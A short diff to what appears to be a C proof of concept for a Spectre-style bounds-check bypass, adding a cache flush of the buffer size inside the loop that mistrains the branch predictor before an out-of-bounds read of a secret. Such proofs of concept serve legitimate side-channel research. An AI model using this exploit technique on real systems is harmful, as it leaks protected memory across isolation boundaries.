@@ -118,6 +118,7 @@ int main(int argc, const char**argv){
   size_t larger_x = (size_t)(secret - (char*)buffer);
   //Mistraining the branch predictor using valid values for x
   for(int i = 0; i < 100; i++){
+    flush(&buffer_size);
     victim(i);
   }
 
